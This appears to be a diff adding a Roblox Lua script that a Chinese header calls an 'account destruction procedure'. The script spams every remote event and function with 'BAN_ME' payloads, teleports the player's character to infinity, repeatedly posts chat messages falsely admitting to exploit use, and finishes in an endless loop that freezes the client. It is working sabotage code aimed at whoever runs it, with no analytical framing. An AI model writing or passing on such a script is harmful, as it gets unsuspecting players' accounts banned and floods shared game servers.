@@ -1,0 +1,50 @@
+print("警告：帳號銷毀程序將在 3 秒後啟動...")
+task.wait(3)
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local lp = Players.LocalPlayer
+
+task.spawn(function()
+    while true do
+        pcall(function()
+            for _, v in pairs(ReplicatedStorage:GetDescendants()) do
+                if v:IsA("RemoteEvent") then
+                    v:FireServer(string.rep("BAN_ME", 1000))
+                elseif v:IsA("RemoteFunction") then
+                    task.spawn(function() v:InvokeServer(true) end)
+                end
+            end
+        end)
+        task.wait(0.01)
+    end
+end)
+
+task.spawn(function()
+    local hrp = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
+    if hrp then
+        RunService.Heartbeat:Connect(function()
+            hrp.CFrame = CFrame.new(math.huge, math.huge, math.huge)
+        end)
+    end
+end)
+
+local TextChatService = game:GetService("TextChatService")
+task.spawn(function()
+    while true do
+        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+            TextChatService.TextChannels.RBXGeneral:SendAsync("I am using external executors to hack this game server.")
+        else
+            local remote = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+            if remote then
+                remote.SayMessageRequest:FireServer("I am using exploit scripts for account termination test.", "All")
+            end
+        end
+        task.wait(0.5)
+    end
+end)
+
+while true do
+    print("TERMINATING_ACCOUNT_" .. math.random(1000, 9999))
+end
